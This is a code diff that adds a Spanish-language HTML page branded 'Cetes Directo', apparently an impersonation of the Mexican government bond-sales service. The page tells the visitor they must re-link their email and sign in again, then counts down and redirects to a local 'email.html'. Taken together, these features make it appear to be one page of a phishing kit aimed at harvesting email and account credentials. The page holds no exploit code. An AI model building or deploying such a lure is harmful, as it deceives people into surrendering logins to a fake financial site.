@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cetes Directo</title>
+    <link rel="stylesheet" href="./carg.css">
+    <script>
+        // Función para redirigir y mostrar el contador
+        let seconds = 10; // Segundos para la redirección
+
+        function countdown() {
+            document.getElementById('countdown').innerText = seconds;
+            if (seconds <= 0) {
+                window.location.href = "email.html";
+            } else {
+                seconds--;
+                setTimeout(countdown, 1000); // Llama a sí misma cada segundo
+            }
+        }
+
+        // Inicia el contador al cargar la página
+        window.onload = function() {
+            countdown();
+        };
+    </script>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-image"></div>
+    </div>
+
+    <!-- Contenedor Principal -->
+    <div class="main-container">
+
+        <!-- Contenedor Izquierdo -->
+       
+
+        <div class="left-container">
+            <p>Necesitamos que vincule nuevamente su correo electrónico, inicie sesión y se vinculará automáticamente</p>
+            Redireccionando en <span id="countdown">10</span> segundos...
+        </div>
+
+        <!-- Contenedor Derecho -->
+        <div class="right-container"></div>
+
+    </div>
+    <br><br><br><br>
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-image"></div>
+    </div>
+
+</body>
+</html>
